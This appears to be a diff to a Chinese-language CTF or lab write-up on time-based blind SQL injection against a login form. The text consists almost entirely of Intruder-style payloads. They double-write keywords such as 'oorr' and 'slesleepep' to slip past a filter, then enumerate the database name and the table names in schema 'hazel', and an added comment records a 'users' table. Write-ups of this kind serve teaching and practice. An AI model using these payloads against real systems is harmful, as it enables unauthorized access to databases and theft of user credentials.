@@ -1024,7 +1024,8 @@ username=114514' oorr iiff(subsubstrstr(database(),§1§,1)='§z§',slesleepep(5
 ```
 username=114514' oorr iiff(length(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='hazel')=§1§,slesleepep(5),3)--+&password=114514
 ```
-爆表名
+爆表名 为 users
 ```
-
+username=114514' oorr iiff(subsubstrstr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='hazel'),§1§,1)='§z§',slesleepep(5),3)--+&password=114514
 ```
+![[Pasted image 20240327164825.png]]
